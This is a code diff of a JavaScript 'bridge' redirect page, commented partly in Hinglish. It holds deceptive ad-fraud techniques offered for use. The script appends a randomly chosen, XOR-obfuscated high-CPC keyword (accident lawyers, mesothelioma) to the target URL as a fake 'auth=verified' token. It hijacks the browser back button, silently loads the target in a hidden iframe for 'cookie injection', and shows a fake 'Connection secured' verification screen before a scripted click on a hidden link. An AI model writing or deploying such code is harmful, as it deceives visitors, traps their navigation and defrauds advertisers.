@@ -100,118 +100,102 @@
     </div>
 
     <script>
-        // ====================================================
-        // 🔥 NEW STRATEGY: AUTO REFRESH (FIX 302/DIRECT)
-        // ====================================================
-        
-        // Check Session: Kya user pehle refresh ho chuka hai?
-        if (!sessionStorage.getItem('secure_session_active')) {
-            // Agar nahi, toh Flag set karo aur Reload maaro
-            console.log("Initializing secure session...");
-            sessionStorage.setItem('secure_session_active', 'true');
-            
-            // Reload page to fix 302 status to 200/304
-            window.location.reload(); 
-        } else {
-            console.log("Secure session active. Ready to redirect.");
-            // Session Active hai, ab niche wala code chalega
-            initBridgePage();
+        const params = new URLSearchParams(window.location.search);
+        let targetUrl = params.get('url');
+        let verified = false;
+        const SECRET_KEY = "MySuperSecretKey2025"; 
+
+        const highPayingKeys = [
+            "mesothelioma_attorney_assistance", "donate_car_tax_credit_usa",
+            "crypto_trading_premium_account", "business_loan_bad_credit_approval",
+            "online_degree_cyber_security_mba", "structured_settlement_annuity_companies",
+            "truck injury lawyer", "truck injury attorney", "accident attorney near me",
+            "attorney car wreck", "accident attorney", "motorcycle injury lawyers",
+            "truck crash lawyers", "truck crash attorney", "top truck accident lawyers",
+            "car wreck lawyer", "car wreck attorneys", "accident lawyer",
+            "auto accident attorney", "attorneys car accident", "best accident lawyers",
+            "auto accident lawyers near me", "auto accident attorneys near me",
+            "car accident attorney near me", "car wreck lawyer near me",
+            "car accident law", "mycoverageinfo agent", "accident lawyer near me",
+            "slip and fall lawyer", "injury law firms", "car crash attorneys",
+            "motorcycle accident lawyer", "motorcycle accident attorneys",
+            "motorcycle accident injury attorney", "injury attorney",
+            "slip and fall attorney", "car accident lawyers near me"
+        ];
+
+        function encryptData(text, key) {
+            let result = "";
+            for (let i = 0; i < text.length; i++) {
+                result += String.fromCharCode(text.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+            }
+            return btoa(result);
         }
 
-        function initBridgePage() {
-            const params = new URLSearchParams(window.location.search);
-            let targetUrl = params.get('url');
-            let verified = false;
-            const SECRET_KEY = "MySuperSecretKey2025"; 
+        // --- 1. STRATEGY: HISTORY MANIPULATION ---
+        // Fake depth create karta hai taaki browser ko lage user purana hai
+        try {
+            history.pushState(null, null, location.href); 
+            window.onpopstate = function () {
+                history.go(1);
+            };
+        } catch(e) {}
 
-            const highPayingKeys = [
-                "mesothelioma_attorney_assistance", "donate_car_tax_credit_usa",
-                "crypto_trading_premium_account", "business_loan_bad_credit_approval",
-                "online_degree_cyber_security_mba", "structured_settlement_annuity_companies",
-                "truck injury lawyer", "truck injury attorney", "accident attorney near me",
-                "attorney car wreck", "accident attorney", "motorcycle injury lawyers",
-                "truck crash lawyers", "truck crash attorney", "top truck accident lawyers",
-                "car wreck lawyer", "car wreck attorneys", "accident lawyer",
-                "auto accident attorney", "attorneys car accident", "best accident lawyers",
-                "auto accident lawyers near me", "auto accident attorneys near me",
-                "car accident attorney near me", "car wreck lawyer near me",
-                "car accident law", "mycoverageinfo agent", "accident lawyer near me",
-                "slip and fall lawyer", "injury law firms", "car crash attorneys",
-                "motorcycle accident lawyer", "motorcycle accident attorneys",
-                "motorcycle accident injury attorney", "injury attorney",
-                "slip and fall attorney", "car accident lawyers near me"
-            ];
-
-            function encryptData(text, key) {
-                let result = "";
-                for (let i = 0; i < text.length; i++) {
-                    result += String.fromCharCode(text.charCodeAt(i) ^ key.charCodeAt(i % key.length));
-                }
-                return btoa(result);
-            }
-
-            // --- HISTORY MANIPULATION ---
+        // --- URL PROCESSING ---
+        if (targetUrl) {
             try {
-                history.pushState(null, null, location.href); 
-                window.onpopstate = function () {
-                    history.go(1);
-                };
-            } catch(e) {}
+                targetUrl = decodeURIComponent(targetUrl);
+                targetUrl = targetUrl.replace(/[?&]m=1/, ''); // Blogger Fix
+                
+                let rawKey = highPayingKeys[Math.floor(Math.random() * highPayingKeys.length)];
+                let securePayload = encryptData(rawKey, SECRET_KEY);
+                let separator = targetUrl.includes('?') ? '&' : '?';
+                targetUrl = targetUrl + separator + 'auth=verified&token=' + securePayload;
 
-            // --- URL PROCESSING ---
-            if (targetUrl) {
-                try {
-                    targetUrl = decodeURIComponent(targetUrl);
-                    targetUrl = targetUrl.replace(/[?&]m=1/, ''); // Blogger Fix
-                    
-                    let rawKey = highPayingKeys[Math.floor(Math.random() * highPayingKeys.length)];
-                    let securePayload = encryptData(rawKey, SECRET_KEY);
-                    let separator = targetUrl.includes('?') ? '&' : '?';
-                    targetUrl = targetUrl + separator + 'auth=verified&token=' + securePayload;
+                // --- 2. STRATEGY: IFRAME WARMING (COOKIE INJECTION) ---
+                // Background me site load karta hai (1.5 sec delay taaki main UI lag na ho)
+                setTimeout(() => {
+                    let iframe = document.createElement('iframe');
+                    iframe.id = 'warmup-frame';
+                    iframe.src = targetUrl;
+                    document.getElementById('iframe-container').appendChild(iframe);
+                    console.log('Cache warming started...');
+                }, 1500);
 
-                    // --- IFRAME WARMING ---
-                    setTimeout(() => {
-                        let iframe = document.createElement('iframe');
-                        iframe.id = 'warmup-frame';
-                        iframe.src = targetUrl;
-                        document.getElementById('iframe-container').appendChild(iframe);
-                    }, 1500);
-
-                } catch (e) { console.log('URL Error'); }
-            }
-
-            function verifyAndRedirect() {
-                if (verified) return;
-                verified = true;
-
-                if (targetUrl) {
-                    document.getElementById('statusTitle').innerText = "Verifying...";
-                    document.getElementById('statusMsg').innerText = "Connection secured. Redirecting...";
-                    document.getElementById('hint').style.display = 'none';
-                    document.getElementById('loader').style.display = 'block';
-                    document.getElementById('iconBox').style.background = "#dff9fb";
-                    document.querySelector('.shield-icon svg').style.fill = "#00b894";
-
-                    setTimeout(() => { document.getElementById('progressBar').style.width = "100%"; }, 100);
-
-                    // --- DELAYED CLICK FOR REFERRER ---
-                    setTimeout(() => {
-                        let link = document.getElementById('hidden-link');
-                        link.href = targetUrl;
-                        link.click(); 
-                    }, 1200); // 1.2 Sec Delay
-                } else {
-                    document.getElementById('statusTitle').innerText = "Link Error";
-                    document.getElementById('statusMsg').innerText = "Destination missing.";
-                    document.getElementById('statusMsg').style.color = "#d63031";
-                }
-            }
-
-            // --- TRIGGERS ---
-            let clickZone = document.getElementById('clickArea');
-            clickZone.addEventListener('click', verifyAndRedirect);
-            clickZone.addEventListener('touchstart', verifyAndRedirect, {passive: false});
+            } catch (e) { console.log('URL Error'); }
         }
+
+        function verifyAndRedirect() {
+            if (verified) return;
+            verified = true;
+
+            if (targetUrl) {
+                document.getElementById('statusTitle').innerText = "Verifying...";
+                document.getElementById('statusMsg').innerText = "Connection secured. Redirecting...";
+                document.getElementById('hint').style.display = 'none';
+                document.getElementById('loader').style.display = 'block';
+                document.getElementById('iconBox').style.background = "#dff9fb";
+                document.querySelector('.shield-icon svg').style.fill = "#00b894";
+
+                setTimeout(() => { document.getElementById('progressBar').style.width = "100%"; }, 100);
+
+                // --- KEY: PROGRAMMATIC CLICK ---
+                setTimeout(() => {
+                    let link = document.getElementById('hidden-link');
+                    link.href = targetUrl;
+                    link.click(); 
+                }, 600); // 600ms delay for visual effect
+            } else {
+                document.getElementById('statusTitle').innerText = "Link Error";
+                document.getElementById('statusMsg').innerText = "Destination missing.";
+                document.getElementById('statusMsg').style.color = "#d63031";
+            }
+        }
+
+        // --- TRIGGERS ---
+        let clickZone = document.getElementById('clickArea');
+        clickZone.addEventListener('click', verifyAndRedirect);
+        clickZone.addEventListener('touchstart', verifyAndRedirect, {passive: false});
+
     </script>
 
 </body>
